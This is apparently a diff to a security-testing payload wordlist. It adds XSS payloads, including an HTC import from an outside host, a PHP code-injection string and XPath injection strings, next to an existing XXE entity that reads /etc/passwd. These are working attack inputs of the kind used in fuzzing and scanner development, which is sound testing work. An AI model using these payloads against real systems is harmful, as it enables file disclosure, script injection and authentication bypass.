@@ -11,6 +11,11 @@
 ]>
 <!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
 ]>
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+<name>','')); phpinfo(); exit;/*</name>
 
 
 ## Element and Attrib Values
@@ -48,3 +53,13 @@ false
 {{Tnn96}}
 {= Tnn96}
 {{= Tnn96}}
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
